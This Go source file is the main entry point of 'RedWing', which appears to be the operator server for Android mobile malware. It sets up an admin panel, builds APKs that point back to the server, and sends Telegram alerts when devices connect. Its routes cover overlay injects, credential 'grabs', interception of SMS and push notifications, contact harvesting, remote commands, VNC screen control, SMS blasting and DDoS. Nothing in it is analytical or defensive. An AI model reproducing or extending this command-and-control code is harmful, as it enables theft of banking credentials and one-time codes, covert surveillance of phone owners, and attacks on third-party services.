package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"strings"

	"redwing/internal/api"
	"redwing/internal/auth"
	"redwing/internal/builder"
	"redwing/internal/db"
	"redwing/internal/ws"
)

func detectLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "127.0.0.1"
	}
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return ipnet.IP.String()
		}
	}
	return "127.0.0.1"
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	port := "8080"
	if p := os.Getenv("PORT"); p != "" {
		port = p
	}

	serverIP := os.Getenv("SERVER_IP")
	if serverIP == "" {
		localIP := detectLocalIP()
		fmt.Printf("\n  IP адрес сервера / Server IP for APK builds (Enter = %s): ", localIP)
		line, _ := reader.ReadString('\n')
		serverIP = strings.TrimSpace(line)
		if serverIP == "" {
			serverIP = localIP
		}
	}
	if serverIP == "0.0.0.0" || serverIP == "" {
		serverIP = detectLocalIP()
	}

	regMode := os.Getenv("REGISTRATION")
	if regMode == "" {
		fmt.Print("  Режим регистрации / Registration mode — open / closed (Enter = closed): ")
		line, _ := reader.ReadString('\n')
		regMode = strings.TrimSpace(strings.ToLower(line))
		if regMode == "" {
			regMode = "closed"
		}
	}

	api.OpenRegistration = (regMode == "open")

	dbPath := "data/redwing.db"
	if p := os.Getenv("DB_PATH"); p != "" {
		dbPath = p
	}

	if err := db.Init(dbPath); err != nil {
		log.Fatalf("Database init failed: %v", err)
	}
	defer db.Close()

	if !api.OpenRegistration {
		var count int
		db.DB.QueryRow("SELECT COUNT(*) FROM users").Scan(&count)
		if count == 0 {
			fmt.Println("\n  Аккаунтов нет. Создание админа...")
			fmt.Println("  No accounts found. Creating admin...")
			fmt.Print("  Логин / Login (Enter = admin): ")
			adminLogin, _ := reader.ReadString('\n')
			adminLogin = strings.TrimSpace(adminLogin)
			if adminLogin == "" {
				adminLogin = "admin"
			}
			fmt.Print("  Пароль / Password (Enter = auto): ")
			adminPass, _ := reader.ReadString('\n')
			adminPass = strings.TrimSpace(adminPass)
			if adminPass == "" {
				adminPass = auth.GenerateID()[:10]
			}

			teamID := api.GenerateTeamIDPublic()
			userID := auth.GenerateID()
			hash, _ := auth.HashPassword(adminPass)
			db.DB.Exec("INSERT OR IGNORE INTO teams (id, name) VALUES (?, ?)", teamID, "admin_team")
			db.DB.Exec(
				"INSERT INTO users (id, team_id, login, display_name, password_hash, role) VALUES (?, ?, ?, ?, ?, ?)",
				userID, teamID, adminLogin, adminLogin, hash, "ts",
			)
			fmt.Println()
			fmt.Println("  ┌─────────────────────────────────┐")
			fmt.Printf("  │  Login:    %-20s │\n", adminLogin)
			fmt.Printf("  │  Password: %-20s │\n", adminPass)
			fmt.Printf("  │  Team ID:  %-20s │\n", teamID)
			fmt.Println("  └─────────────────────────────────┘")
			fmt.Println()
		} else {
			fmt.Printf("\n  Аккаунтов в базе: %d / Accounts in DB: %d\n", count, count)
		}
	}

	serverAddr := serverIP + ":" + port
	api.ServerIP = serverAddr

	var firstTeamID string
	db.DB.QueryRow("SELECT id FROM teams ORDER BY rowid ASC LIMIT 1").Scan(&firstTeamID)
	if firstTeamID == "" {
		firstTeamID = api.GenerateTeamIDPublic()
	}

	builderToken := os.Getenv("BUILDER_BOT_TOKEN")
	if builderToken == "" && firstTeamID != "" {
		builderToken = api.GetSetting(firstTeamID, "builder_bot_token")
	}
	builder.GetSetting = api.GetSetting
	builder.Init(serverAddr, ".")
	if builderToken != "" {
		builder.StartBot(builderToken, "RedWing Team", serverAddr, ".", firstTeamID)
	}
	builder.StartAll(serverAddr, ".")

	ws.H.OnDeviceConnect = func(teamID, deviceID, model, country string) {
		api.SendTelegramNotification(teamID, "connect", map[string]string{
			"device_id": deviceID, "model": model, "country": country,
		})
		api.TriggerRetranslator(teamID, deviceID)
	}

	ws.H.OnPanelAction = func(teamID, login, role, action, deviceID, details string) {
		api.LogAction(teamID, login, role, action, deviceID, details, "ws")
	}

	if firstTeamID != "" {
		api.SeedDefaultInjects(firstTeamID)
	}

	mux := http.NewServeMux()

	mux.HandleFunc("/api/login", api.HandleLogin)
	mux.HandleFunc("/api/register", api.HandleRegister)
	mux.HandleFunc("/api/validate_session", api.HandleValidateSession)
	mux.HandleFunc("/api/logout", api.HandleLogout)
	mux.HandleFunc("/api/config", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if api.OpenRegistration {
			w.Write([]byte(`{"open_registration":true}`))
		} else {
			w.Write([]byte(`{"open_registration":false}`))
		}
	})

	s := api.RequireSession

	mux.HandleFunc("/api/panel/stats/", s(api.HandleStats))
	mux.HandleFunc("/api/panel/events/", s(api.HandleEvents))
	mux.HandleFunc("/api/panel/devices/", s(api.HandleDevices))
	mux.HandleFunc("/api/panel/command/", s(api.HandlePanelCommand))
	mux.HandleFunc("/api/panel/commands/", s(api.HandlePanelCommands))

	mux.HandleFunc("/api/settings/", s(api.HandleSettings))
	mux.HandleFunc("/api/profile/", s(api.HandleProfile))
	mux.HandleFunc("/api/profile", s(api.HandleProfile))

	mux.HandleFunc("/api/panel/injects/templates/", s(api.HandleInjectTemplates))
	mux.HandleFunc("/api/panel/injects/template/", s(api.HandleInjectTemplate))
	mux.HandleFunc("/api/panel/injects/toggle", s(api.HandleInjectToggle))
	mux.HandleFunc("/api/panel/injects/data/", s(api.HandleInjectData))
	mux.HandleFunc("/api/inject-constructor/ensure-defaults", s(api.HandleEnsureDefaults))
	mux.HandleFunc("/api/inject-constructor/page", s(api.HandleInjectConstructor))

	mux.HandleFunc("/api/panel/notifications/", s(api.HandleNotifySettings))
	mux.HandleFunc("/api/panel/telegram/test", s(api.HandleTelegramTest))
	mux.HandleFunc("/api/telegram/test", s(api.HandleTelegramTest))

	mux.HandleFunc("/api/panel/workers/", s(api.HandleWorkers))
	mux.HandleFunc("/api/workers/", s(api.HandleWorkers))

	mux.HandleFunc("/api/panel/action-logs/", s(api.HandleActionLogs))
	mux.HandleFunc("/api/panel/antichernukha/", s(api.HandleAntiChernukhaSettings))

	mux.HandleFunc("/api/panel/device/apps/", s(api.HandleDeviceApps))
	mux.HandleFunc("/api/panel/device/sms/", s(api.HandleDeviceSMS))
	mux.HandleFunc("/api/panel/device/push/", s(api.HandleDevicePushLogs))
	mux.HandleFunc("/api/panel/device/grabs/", s(api.HandleDeviceGrabs))
	mux.HandleFunc("/api/panel/device/label", s(api.HandleDeviceLabel))
	mux.HandleFunc("/api/panel/device/delete", s(api.HandleDeviceDelete))

	mux.HandleFunc("/api/panel/blast/", s(api.HandleBlast))
	mux.HandleFunc("/api/blast/", s(api.HandleBlastCompat))
	mux.HandleFunc("/api/panel/ddos", s(api.HandleDDoS))
	mux.HandleFunc("/api/ddos/", s(api.HandleDDoS))

	mux.HandleFunc("/api/data/device/register", api.HandleDeviceRegister)
	mux.HandleFunc("/api/data/device/update", api.HandleDeviceUpdate)
	mux.HandleFunc("/api/data/device/update_phone", api.HandleDeviceUpdate)
	mux.HandleFunc("/api/data/device/update_last_seen", api.HandleDeviceHeartbeat)
	mux.HandleFunc("/api/data/commands/pending", api.HandleCommandsPending)
	mux.HandleFunc("/api/data/commands/update_status", api.HandleCommandStatus)
	mux.HandleFunc("/api/data/contacts/sync", api.HandleDataSync)
	mux.HandleFunc("/api/data/inject", api.HandleDeviceInjectResult)
	mux.HandleFunc("/api/data/inject/templates", api.HandleDeviceInjectTemplates)
	mux.HandleFunc("/api/data/push", api.HandleDevicePushNotification)
	mux.HandleFunc("/api/data/sms", api.HandleDeviceSMSIncoming)
	mux.HandleFunc("/api/data/log", api.HandleDataSync)
	mux.HandleFunc("/api/bootstrap", api.HandleBootstrap)

	mux.HandleFunc("/api/vnc-token", s(api.HandleVNCToken))

	mux.HandleFunc("/screen", ws.HandleDeviceWS)
	mux.HandleFunc("/screen/", ws.HandleDeviceWS)
	mux.HandleFunc("/proxy/", ws.HandleDeviceWS)
	mux.HandleFunc("/vnc-ws", ws.HandlePanelWS)

	webFS := http.FileServer(http.Dir("web"))
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path

		if r.Header.Get("Upgrade") == "websocket" || r.Header.Get("Connection") == "Upgrade" {
			ws.HandleDeviceWS(w, r)
			return
		}

		if strings.HasPrefix(path, "/api/") || strings.HasPrefix(path, "/data/") {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			w.Write([]byte(`{"status":"ok"}`))
			return
		}

		protectedPages := []string{"/", "/panel_new.html", "/dashboard.html", "/devices.html", "/vnc.html",
			"/injects.html", "/blast.html", "/ddos.html", "/workers.html", "/settings.html"}

		isProtected := false
		for _, p := range protectedPages {
			if path == p {
				isProtected = true
				break
			}
		}

		if isProtected {
			_, err := auth.GetSessionFromRequest(r)
			if err != nil {
				http.Redirect(w, r, "/login.html", http.StatusFound)
				return
			}
			if path == "/" || path == "/dashboard.html" {
				http.ServeFile(w, r, "web/panel_new.html")
				return
			}
			http.ServeFile(w, r, "web"+path)
			return
		}

		if path == "/login.html" {
			_, err := auth.GetSessionFromRequest(r)
			if err == nil {
				http.Redirect(w, r, "/", http.StatusFound)
				return
			}
			http.ServeFile(w, r, "web/login.html")
			return
		}

		cleanPath := strings.Split(path, "?")[0]
		if _, err := os.Stat("web" + cleanPath); err == nil {
			webFS.ServeHTTP(w, r)
			return
		}

		http.Redirect(w, r, "/login.html", http.StatusFound)
	})

	listenAddr := "0.0.0.0:" + port

	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
	fmt.Printf("  Server starting on %s\n", listenAddr)
	fmt.Printf("  Database:     %s\n", dbPath)
	fmt.Printf("  Registration: %s\n", regMode)
	fmt.Printf("  APK server:   %s\n", serverAddr)
	fmt.Printf("  Panel:        http://%s\n", serverAddr)
	fmt.Printf("  Device WS:    ws://%s/screen\n", serverAddr)
	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

	if err := http.ListenAndServe(listenAddr, mux); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}
